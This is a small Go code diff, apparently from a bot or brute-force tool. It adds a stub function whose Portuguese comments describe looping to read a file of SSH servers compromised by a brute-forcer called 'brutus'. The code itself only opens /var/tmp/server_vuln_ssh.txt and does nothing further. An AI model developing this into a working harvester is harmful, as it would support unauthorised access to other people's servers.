@@ -6,6 +6,7 @@ import (
 	"net/http"
         "fmt"
        "time"
+      "os"
       
 
 
@@ -66,3 +67,47 @@ func bot(msg string ) {
 
 
 }
+
+
+
+
+
+
+
+
+     //essa funcao vai verifica em um lopp infinito  o arquivo  server_vuln_ssh.txt  que sera gerado pelo  brutus em  caso
+     //dele  te sucesso na busca de alvos 
+
+
+
+
+
+func  verify_ips_ssh_by_brutus(){
+
+
+
+filename := "server_vuln_ssh.txt"
+
+
+os.Open("/var/tmp/" +  filename )
+
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
